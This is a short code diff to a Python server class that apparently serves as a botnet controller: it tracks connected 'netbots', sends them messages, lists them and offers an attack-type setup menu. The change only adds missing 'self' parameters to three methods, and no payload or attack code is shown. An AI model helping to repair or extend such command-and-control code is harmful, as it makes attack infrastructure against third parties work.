@@ -71,11 +71,11 @@ class Server:
 
                 socketfd.send(netbot.id, message.encode(), len(message),0)
 
-    def close_connected_sockets():
+    def close_connected_sockets(self):
         for netbot in netbots:
             socketfd.close(netbot.id)
     
-    def list_bots():
+    def list_bots(self):
         os.system("clear")
         print(f"\n\nBots connected ({len(netbots)}):\n")
 
@@ -86,7 +86,7 @@ class Server:
 
         input()
         
-    def setup_attack_type():
+    def setup_attack_type(self):
         attack = ""
         int_choice = 0
         while True:
